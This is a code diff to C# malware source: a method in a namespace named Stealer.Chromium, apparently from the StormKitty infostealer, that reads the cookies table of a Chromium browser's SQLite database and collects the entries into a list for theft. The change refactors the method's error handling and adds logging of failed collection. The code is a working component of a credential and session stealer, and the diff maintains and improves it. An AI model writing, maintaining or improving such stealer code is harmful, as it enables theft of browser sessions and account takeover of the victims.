@@ -12,14 +12,13 @@ namespace Stealer.Chromium
         /// <returns>List with cookies</returns>
         public static List<Cookie> Get(string sCookie)
         {
+            List<Cookie> lcCookies = new List<Cookie>();
+
             try
             {
-                List<Cookie> lcCookies = new List<Cookie>();
-
                 // Read data from table
                 SQLite sSQLite = SqlReader.ReadTable(sCookie, "cookies");
-                if (sSQLite == null)
-                    return lcCookies;
+                if (sSQLite == null) return lcCookies;
 
                 for (int i = 0; i < sSQLite.GetRowCount(); i++)
                 {
@@ -43,10 +42,9 @@ namespace Stealer.Chromium
                     Counter.Cookies++;
                     lcCookies.Add(cCookie);
                 }
-
-                return lcCookies;
             }
-            catch { return new List<Cookie>(); }
+            catch (System.Exception ex) { StormKitty.Logging.Log("Chromium >> Failed collect cookies\n" + ex); }
+            return lcCookies;
         }
     }
 }
